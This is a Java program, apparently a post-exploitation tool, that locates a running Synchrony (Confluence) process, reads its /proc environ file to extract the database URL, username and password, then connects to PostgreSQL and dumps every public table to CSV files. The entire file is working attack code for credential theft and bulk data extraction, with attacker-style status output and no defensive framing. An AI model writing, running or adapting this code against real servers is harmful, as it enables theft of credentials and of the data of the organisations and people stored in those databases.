import java.nio.file.*;
import java.sql.*;
import java.io.*;

public class ExtractPostgres {
    public static void main(String[] args) throws Exception {
        if (args.length < 1) {
            System.out.println("Usage: java ExtractPostgres <output_directory>");
            return;
        }

        String outputDir = args[0];

        // Find process running PostgreSQL application
        Process process = Runtime.getRuntime().exec(new String[]{"sh", "-c", "pgrep -fa 'synchrony.core sql'"});
        process.waitFor();
        String pid = new String(process.getInputStream().readAllBytes()).trim().split(" ")[0];
        if (pid.isEmpty()) throw new RuntimeException("Process not found");

        System.out.println("[+] Found PID: " + pid);

        // Read environment variables of the target process
        String env = new String(Files.readAllBytes(Paths.get("/proc/" + pid + "/environ"))).replace("\0", "\n");
        String url = get(env, "synchrony.database.url=");
        String user = get(env, "synchrony.database.username=");
        String pass = get(env, "synchrony.database.password=");

        if (url == null || user == null || pass == null) {
            throw new RuntimeException("[-] Missing database credentials!");
        }

        System.out.println("[+] Extracted database credentials:");
        System.out.println("    URL: " + url);
        System.out.println("    Username: " + user);
        System.out.println("    Password: [REDACTED]");

        // Parse the URL to extract host, port, and database
        String[] parts = url.replace("jdbc:postgresql://", "").split("/");
        String hostPort = parts[0];
        String dbName = parts[1];

        String[] hostPortSplit = hostPort.split(":");
        String host = hostPortSplit[0];
        String port = hostPortSplit.length > 1 ? hostPortSplit[1] : "5432";

        System.out.println("[+] Parsed connection details:");
        System.out.println("    Host: " + host);
        System.out.println("    Port: " + port);
        System.out.println("    Database: " + dbName);

        String jdbcUrl = "jdbc:postgresql://" + host + ":" + port + "/" + dbName;

        try (Connection conn = DriverManager.getConnection(jdbcUrl, user, pass)) {
            System.out.println("[+] Connected to PostgreSQL successfully!");

            // Query to fetch all tables from the public schema
            String sql = "SELECT table_name FROM information_schema.tables WHERE table_schema = 'public'";
            try (Statement stmt = conn.createStatement();
                 ResultSet tables = stmt.executeQuery(sql)) {

                while (tables.next()) {
                    String tableName = tables.getString("table_name");
                    System.out.println("[+] Dumping table: " + tableName);

                    // Dump each table to CSV locally
                    dumpTableToFile(conn, tableName, outputDir);
                }
            }

            System.out.println("[+] Database extraction completed.");
        } catch (SQLException e) {
            System.err.println("[-] Database connection failed: " + e.getMessage());
        }
    }

    private static void dumpTableToFile(Connection conn, String tableName, String outputDir) {
        String filePath = outputDir + "/" + tableName + "_backup.csv";
        String query = "SELECT * FROM " + tableName;

        try (Statement stmt = conn.createStatement();
             ResultSet rs = stmt.executeQuery(query);
             BufferedWriter writer = new BufferedWriter(new FileWriter(filePath))) {

            // Get column headers
            ResultSetMetaData metadata = rs.getMetaData();
            int columnCount = metadata.getColumnCount();

            for (int i = 1; i <= columnCount; i++) {
                writer.write(metadata.getColumnName(i));
                if (i < columnCount) writer.write(",");
            }
            writer.newLine();

            // Write rows to file
            while (rs.next()) {
                for (int i = 1; i <= columnCount; i++) {
                    String value = rs.getString(i);
                    writer.write(value != null ? value : "NULL");
                    if (i < columnCount) writer.write(",");
                }
                writer.newLine();
            }

            System.out.println("[+] Table " + tableName + " dumped to " + filePath);
        } catch (SQLException | IOException e) {
            System.err.println("[-] Failed to dump table " + tableName + ": " + e.getMessage());
        }
    }

    private static String get(String env, String key) {
        return env.lines()
                  .filter(l -> l.startsWith(key))
                  .map(l -> l.split("=", 2)[1])
                  .findFirst()
                  .orElse(null);
    }
}
